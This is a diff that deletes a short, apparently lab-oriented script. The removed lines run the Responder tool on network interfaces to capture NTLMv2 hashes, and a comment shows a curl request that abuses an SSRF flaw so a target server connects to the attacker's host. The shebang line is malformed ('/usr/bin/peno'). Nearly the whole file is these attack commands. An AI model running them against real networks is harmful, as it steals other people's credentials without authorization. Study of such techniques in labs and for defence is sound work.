@@ -1,9 +1,0 @@
-#!/usr/bin/peno
-
-#running responder on our active network interface.
-#That can help  to steal a NTLMv2 handshake(SSRF)
-#curl http://192.168.120.91:8080/?url=http://our-ip
-sudo responder -I tap0
-responder -I eth0 -rv
-
-
